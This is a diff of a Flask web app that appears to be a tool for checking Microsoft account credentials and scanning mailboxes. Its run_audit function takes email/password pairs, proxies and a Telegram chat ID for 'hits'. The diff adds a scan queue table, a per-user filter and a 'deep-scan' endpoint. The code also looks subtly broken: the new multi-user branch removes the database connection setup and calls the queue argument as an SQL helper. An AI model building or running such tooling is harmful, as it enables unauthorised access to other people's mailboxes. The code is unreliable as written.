@@ -53,13 +53,30 @@ def init_db():
                 saved_senders TEXT
             )
         ''')
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS scan_requests (
+                id SERIAL PRIMARY KEY,
+                username TEXT NOT NULL,
+                status TEXT DEFAULT 'pending',
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
     else:
         c.execute('''
             CREATE TABLE IF NOT EXISTS users (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 username TEXT UNIQUE NOT NULL,
                 password_hash TEXT NOT NULL,
-                telegram_chat_id TEXT
+                telegram_chat_id TEXT,
+                saved_senders TEXT
+            )
+        ''')
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS scan_requests (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                username TEXT NOT NULL,
+                status TEXT DEFAULT 'pending',
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         ''')
         try:
@@ -99,7 +116,7 @@ def emit_event(q, event_type, data):
         print(f"[EVENT] {event_type} | {data}")
 
 
-def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_chat_id="", multi_user=False, hit_buffer=None):
+def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_chat_id="", multi_user=False, hit_buffer=None, target_user_filter=None):
     """
     Flujo 7 pasos (basado en test_flow_dlp.py):
     1. Auth page     → microsoftonline.com con UA android
@@ -406,12 +423,16 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
     if multi_user:
         # Fetch all users with saved senders and Telegram chat IDs
         try:
-            conn = get_db_conn()
-            c = conn.cursor()
-            sql = ("SELECT username, telegram_chat_id, saved_senders FROM users "
-                   "WHERE saved_senders IS NOT NULL AND saved_senders != '' "
-                   "AND telegram_chat_id IS NOT NULL AND telegram_chat_id != ''")
-            c.execute(sql)
+            if target_user_filter:
+                sql = ("SELECT username, telegram_chat_id, saved_senders FROM users "
+                       "WHERE username = ? AND saved_senders IS NOT NULL AND saved_senders != '' "
+                       "AND telegram_chat_id IS NOT NULL AND telegram_chat_id != ''")
+                c.execute(q(sql), (target_user_filter,))
+            else:
+                sql = ("SELECT username, telegram_chat_id, saved_senders FROM users "
+                       "WHERE saved_senders IS NOT NULL AND saved_senders != '' "
+                       "AND telegram_chat_id IS NOT NULL AND telegram_chat_id != ''")
+                c.execute(sql)
             db_users = c.fetchall()
             conn.close()
             
@@ -857,6 +878,32 @@ def stream(session_id):
 
     return Response(event_stream(), mimetype='text/event-stream',
                     headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
+
+
+@app.route('/api/deep-scan', methods=['POST'])
+def trigger_deep_scan():
+    if 'username' not in session:
+        return jsonify({"error": "No has iniciado sesión"}), 401
+    
+    username = session['username']
+    
+    try:
+        conn = get_db_conn()
+        c = conn.cursor()
+        
+        # Verificar si ya hay uno pendiente
+        c.execute(q("SELECT id FROM scan_requests WHERE username = ? AND status = 'pending'"), (username,))
+        if c.fetchone():
+            conn.close()
+            return jsonify({"error": "Ya tienes un escaneo profundo en espera"}), 400
+            
+        c.execute(q("INSERT INTO scan_requests (username, status) VALUES (?, 'pending')"), (username,))
+        conn.commit()
+        conn.close()
+        
+        return jsonify({"message": "✅ Escaneo profundo solicitado. Se procesará en segundo plano poco a poco."})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 
 if __name__ == '__main__':
